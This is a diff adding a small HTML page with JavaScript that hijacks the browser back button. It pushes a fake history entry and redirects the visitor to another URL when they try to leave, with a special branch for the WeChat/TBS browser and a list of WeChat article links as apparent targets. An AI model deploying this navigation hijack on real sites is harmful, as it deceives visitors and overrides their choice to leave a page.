@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Title</title>
+	<!--<script type="text/javascript" src="vconsole.js"></script>-->
+	<!--<script>-->
+		<!--var vConsole = new VConsole();-->
+	<!--</script>-->
+	<script>
+        var url = [
+            'https://mp.weixin.qq.com/s?__biz=Mzg2MjI0MzA4NQ==&mid=2247485712&idx=1&sn=e390de6b77c535f319dbfbf4decf7895&chksm=ce0b9972f97c1064bc33d1ff79fa7c0f690b98b4440cad28148ebd33d5152b3f0d6203307a27&token=86167973&lang=zh_CN#rd',
+            'https://mp.weixin.qq.com/s?__biz=Mzg5MDM2Nzc3NA==&mid=2247483809&idx=1&sn=4ec3c50f0e3c78fa977ef195dbf88d5d&chksm=cfdcfbd0f8ab72c64345b4e9c0fbe3903c83a66ea69c17985d3d31d649e953c8bf23588625cd&token=1884875227&lang=zh_CN#rd',
+            'https://mp.weixin.qq.com/s?__biz=Mzg5MDM2Nzc3NA==&mid=2247483795&idx=4&sn=00f4276d08814d233a587849a8403574&chksm=cfdcfbe2f8ab72f40c1adb9225802f7ceddeef8366c497d0b2df2d946bb0aadfd3dcf65fbc7b&token=1884875227&lang=zh_CN#rd',
+            'https://mp.weixin.qq.com/s?__biz=Mzg2MjI0MzA4NQ==&mid=2247485688&idx=1&sn=d8bed37fb696f235c7d79b3d65349981&chksm=ce0b989af97c118c7553567858c9a8c179eb49b910d85694ed539155bb35c556dca7bd41ceb5&token=86167973&lang=zh_CN#rd',
+            'https://mp.weixin.qq.com/s?__biz=Mzg2MjI0MzA4NQ==&mid=2247485680&idx=2&sn=7482db207e6d025b36de3953e38bbccf&chksm=ce0b9892f97c1184a823892e7c73bee13b1de8b703b6f4b7f2e91ea6a23593a539db3e30afd6&token=86167973&lang=zh_CN#rd',
+			'https://mp.weixin.qq.com/s?__biz=Mzg2MjI0MzA4NQ==&mid=2247485716&idx=1&sn=591b5b4bc56c4043da84d6836586dae2&chksm=ce0b9976f97c10606526ecc652fc42d0d5de5ee284eef1424b33381998c2b82ab1e3eacde8a7&token=86167973&lang=zh_CN#rd',
+			'https://mp.weixin.qq.com/s?__biz=Mzg2MjI0MzA4NQ==&mid=2247485702&idx=1&sn=a665e9170faa0611736a31b854c99e52&chksm=ce0b9964f97c1072ae58ea118a9b71c9daf2c8dde100098baa07833314ac3b8509715bcc6b92&token=86167973&lang=zh_CN#rd'
+        ]
+
+
+        function gogg(url) {
+            history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + new Date().getTime());
+            if (navigator.userAgent.indexOf('Android') != -1) {
+                if (typeof (tbsJs) != "undefined") {
+                    tbsJs.onReady('{useCachedApi : "true"}', function (e) {
+                    })
+                    window.onhashchange = function () {
+                        location.href = url;
+                    };
+                } else {
+                    var pop = 0;
+                    window.onhashchange = function (event) {
+                        pop++
+                        if (pop >= 3) {
+                            location.href = url;
+                        } else {
+                            history.go(1)
+                        }
+                    };
+                    history.go(-1);
+                }
+            } else {
+                window.onhashchange = function () {
+                    location.href = url;
+                };
+            }
+        }
+
+        gogg('http://192.168.5.158:8888/vue-ts/other/html/project/module/退弹.html?test=' + Number(Number(getParam('test'))+1) +'')
+
+		setTimeout(() => {
+            // window.history.back(-1);
+		}, 0)
+
+        function makeRandomArr(arrList, num) { // 随机取出数组元素
+            if (num > arrList.length) {
+                num = arrList.length // eslint-disable-line
+            }
+            var tempArr = arrList.slice(0)
+            var newArrList = []
+            for (var i = 0; i < num; i++) {
+                var random = Math.floor(Math.random() * (tempArr.length))
+                var arr = tempArr[random]
+                tempArr.splice(random, 1)
+                newArrList.push(arr)
+            }
+            return newArrList
+        }
+
+        function getParam(name, url) { // 获取地址栏参数
+            if (typeof name !== 'string') return false
+            if (!url) url = window.location.href
+            // 当遇到name[xx]时，对方括号做一下转义为 name\[xxx\]，因为下面还需要使用name做正则
+            name = name.replace(/[\[\]]/g, '\\$&')
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)')
+            var results = regex.exec(url)
+            if (!results) return null
+            if (!results[2]) return ''
+            return decodeURIComponent(results[2].replace(/\+/g, ' '))
+        }
+
+	</script>
+</head>
+<body>
+</body>
+</html>
